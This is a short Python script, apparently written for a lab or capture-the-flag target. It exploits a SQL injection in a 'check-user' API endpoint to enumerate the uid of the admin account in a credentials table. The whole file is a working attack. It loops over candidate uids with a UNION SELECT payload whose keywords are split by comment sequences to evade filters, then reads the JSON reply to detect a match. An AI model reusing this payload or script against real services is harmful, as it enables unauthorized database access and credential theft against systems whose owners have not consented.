#!/usr/bin/python3



import requests

"""
to get the uid from the credentials table
abussing the api/url sql injection leakage
"""





if __name__ == "__main__":

    try:
        for x in range(1, 1000):
            ress = requests.get(url=f"http://10.129.12.58:8080/api/v1/check-user?u=admin'//**//**/**/Union//**//**/**/SeLect//**//**/**/username//**//**/**/From//**//**/**/credentials//**//**/**/whERE//**//**/**/uid={x}//**//**/**/And//**//**/**/username='admin'-/**/-")


            if ress.json()["exists"] is True:
                print(f"[*] the uid is {x}")
                break
    except Exception as e:
        print(str(e))
        exit(1)


    except KeyboardInterrupt:
        exit(0)
